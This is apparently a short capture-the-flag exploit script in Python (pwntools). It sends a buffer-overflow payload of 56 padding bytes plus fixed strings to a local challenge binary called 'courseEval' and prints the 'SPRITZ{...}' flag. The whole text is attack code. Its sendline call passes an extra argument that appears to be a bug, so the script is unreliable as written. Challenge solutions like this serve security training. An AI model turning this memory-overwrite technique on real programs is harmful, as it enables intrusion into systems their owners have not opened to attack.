from pwn import *

p = process('./courseEval')
p.sendline(b'a' * 56 + b'UniPD_01' + b'CPP-' + b'PWN-', b'Pier')

log.success(p.recvline_regex(rb"SPRITZ{.*}").decode("ascii")) #per la stampa su console